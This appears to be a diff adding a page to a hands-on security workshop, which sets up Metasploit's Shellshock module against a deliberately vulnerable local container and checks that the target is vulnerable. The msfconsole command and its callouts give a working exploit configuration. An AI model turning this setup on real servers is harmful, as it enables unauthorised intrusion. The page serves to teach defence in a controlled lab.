@@ -1,0 +1,66 @@
+We are going to run metasploit as a non-root user in another terminal which we'll refer to as *Terminal 2* in the tabs below.  If you haven't already, you can split your terminal to open a new, non-root, shell
+
+.Terminal Split button
+image::terminal-split-annotated.png[]
+
+Then run the following commands in the newly created terminal: 
+
+[tabs]
+====
+Terminal 2::
++
+--
+. Start up metasploit in your terminal by running the following command:
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+msfconsole \
+    -x \#<.>
+"use multi/http/apache_mod_cgi_bash_env_exec; #<.>
+set RHOST 127.0.0.1; #<.>
+set RPORT 8081; #<.>
+set LHOST $(dig +short myip.opendns.com @resolver1.opendns.com); #<.>
+set targeturi /cgi-bin/log-visitor.sh" #<.>
+----
+<.> The `-x` option allows us to pass commands directly into metasploit (see following explanations of each).  We use this to save setup time
+<.> This is a metasploit module that plugs into the console.  There is a whole library of modules that are used with metasploit.  This one specifically targets the shellshock vulnerability via Apache's cgi-bin support
+<.> This is the address of the server (which we're running locally in a container)
+<.> The port the container is listening on (in our case the port that is forwarded to the container via the `-p` option to `podman run`)
+<.> The public ip address of the VM instance (as reported by `dig`).  This is necessary for how metasploit works
+<.> The target URL of a cgi-bin script.  Those that are astute might recognize this as the cgi-bin endpoint of the guestbook page (`hello.html`)
++
+.NOTE
+****
+If asked if you want to setup a new database, answer no
+
+----
+Would you like to use and setup a new database (recommended)?
+----
+****
++
+. When it's done initializing, you should see output something like this (ASCII art, "tip", and LHOST will vary)
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+include::partial$metasploit_output_initial.adoc[]
+----
++
+. To ensure we've got everything right, we can check whether our setup is currently targeting a vulnerable container
++
+[.console-input]
+[source,bash,subs="+macros,+attributes"]
+----
+check
+----
++
+. Which should report the following output if successful: 
++
+[.console-output]
+[source,bash,subs="+macros,+attributes"]
+----
+[+] 127.0.0.1:8081 - The target is vulnerable.
+----
+--
+====
